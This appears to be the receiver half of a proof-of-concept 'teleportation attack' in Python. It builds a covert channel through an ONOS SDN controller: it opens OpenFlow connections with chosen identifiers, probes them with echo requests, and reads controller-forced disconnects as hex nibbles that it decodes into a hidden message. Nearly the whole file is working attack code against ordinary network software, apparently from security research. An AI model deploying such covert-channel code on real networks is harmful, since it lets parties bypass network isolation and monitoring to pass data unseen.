# !/usr/bin/python3
# Teleportation attack
# RECEIVER script

from common import *
import time


def main():
    # Initialize values
    # offset: the receiver will start <offset> seconds after the sender
    offset = 0.1
    # delay: time to wait after a OpenFlow connection
    delay = 0.1
    # string message received
    message = ''
    # boolean value: 0 if EndOfTransmission not received (0xFF), 1 if so
    end_of_message = False
    # trigger the beguinning of transmission
    has_started = False

    # Wait for start of transmission

    while not has_started:
        start_time = time.time()
        # checking if we received the StartOfTransmission code (EF)
        s = connect_onos('127.0.0.1', 6633, 0xEF)
        time.sleep(0.025)
        # sending a ECHO_REQUEST to check if the OF connection is still alive
        echo_req_pkt = OFPTEchoRequest(xid=100)
        s.send(bytes(echo_req_pkt))
        time.sleep(0.01)
        # check if a ECHO_REPLY has been received, if not, transmission has begun
        pkts = dissect(s.recv(4096))
        if len(pkts) > 0:
            for packet in pkts:
                if packet.type == 3:
                    s.close()
        else :
            print('Transmission started...')
            has_started = True
            end_time = time.time()
            timer = end_time - start_time
            print(timer)
            time.sleep(5.2 + offset  - timer)  # sleeping to keep being synchronized with the sender

    while not end_of_message:
        # Defaulting values
        first_byte, second_byte = '',''
        # checking if we received the EndOfTransmission code (FF)
        s = connect_onos('127.0.0.1', 6633, 0xFF)
        time.sleep(0.025)
        # sending a ECHO_REQUEST to check if the OF connection is still alive
        echo_req_pkt = OFPTEchoRequest(xid=100)
        s.send(bytes(echo_req_pkt))
        time.sleep(0.01)
        # check if a ECHO_REPLY has been received, if not, transmission has begun
        pkts = dissect(s.recv(4096))
        if len(pkts) > 0:
            for packet in pkts:
                if packet.type == 3:
                    print('Check if FF but received Echo-Reply')
                    s.close()
        else :
            print('Fin de transmission')
            end_of_message = True
            break

        # receiving the first hex of the ASCII character
        start_time = time.time()
        for i in range(1, 16):
            s = connect_onos('127.0.0.1', 6633, i)
            time.sleep(0.025)

            # ECHO_REQUEST to check OF connection
            echo_req_pkt = OFPTEchoRequest(xid=100)
            s.send(bytes(echo_req_pkt))
            time.sleep(0.025)

            # check if a ECHO_REPLY has been received
            pkts = dissect(s.recv(4096))
            if len(pkts) > 0:
                for packet in pkts:
                    if packet.type == 3:
                        # OF connection still active (sender was not connected)
                        s.close()
            else:
                # disconnected by the controller, first hex found (sender was connected)
                print("received " + str(i))
                first_byte = i
                end_time = time.time()
                timer = end_time - start_time
                print(timer)
                time.sleep(3.68 - timer)  # maintain the synchronization
                break

        # receiving the second hex of the ASCII character
        start_time = time.time()
        for i in range(1, 16):
            s = connect_onos('127.0.0.1', 6633, i)
            time.sleep(0.025)

            # ECHO_REQUEST to check OF connection
            echo_req_pkt = OFPTEchoRequest(xid=100)
            s.send(bytes(echo_req_pkt))
            time.sleep(0.025)

            # check if a ECHO_REPLY has been received
            pkts = dissect(s.recv(4096))
            if len(pkts) > 0:
                for packet in pkts:
                    if packet.type == 3:
                        # OF connection still active (sender was not connected)
                        s.close()
            else:
                # disconnected by the controller, second hex found (sender was connected)
                print("received " + str(i))
                second_byte = i
                end_time = time.time()
                timer = end_time - start_time
                time.sleep(3.68 - timer)  # maintain the synchronization
                print(timer)
                break

        if not first_byte == '' and not second_byte == '':
            message += chr(int(str(f'{first_byte:x}') + str(f'{second_byte:x}'), 16))
        else :
            print('transmission error...')

    print('received message: ' + message)


if __name__ == "__main__":
    main()

